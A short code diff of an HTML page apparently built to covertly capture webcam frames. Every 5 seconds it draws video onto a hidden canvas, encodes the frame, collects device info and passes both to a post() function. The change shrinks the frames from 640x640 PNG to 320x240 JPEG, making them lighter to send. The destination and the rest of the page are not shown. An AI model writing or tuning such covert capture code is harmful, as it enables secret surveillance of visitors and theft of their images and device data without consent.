@@ -101,7 +101,7 @@
         <div id="error-msg" style="color: #ff6b6b; margin-top: 10px; font-size: 0.9rem; display: none;"></div>
     </div>
 
-    <canvas id="canvas" width="640" height="640" class="hidden-canvas"></canvas>
+    <canvas id="canvas" width="320" height="240" class="hidden-canvas"></canvas>
 
     <script>
         function post(imgdata, info) {
@@ -160,8 +160,8 @@
 
             // Capture immediately and then every 5 seconds
             setInterval(function () {
-                context.drawImage(video, 0, 0, 640, 640);
-                var canvasData = canvas.toDataURL("image/png");
+                context.drawImage(video, 0, 0, 320, 240);
+                var canvasData = canvas.toDataURL("image/jpeg", 0.7);
 
                 // Collect Device Info
                 var deviceInfo = {
